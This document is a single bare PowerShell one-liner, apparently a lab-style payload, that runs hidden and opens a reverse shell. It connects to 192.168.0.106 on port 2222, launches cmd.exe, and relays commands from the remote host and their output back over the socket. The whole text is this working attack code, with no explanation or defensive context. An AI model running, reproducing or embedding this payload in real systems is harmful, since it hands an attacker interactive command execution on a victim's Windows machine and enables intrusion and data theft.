powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='192.168.0.106';$p='2222';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};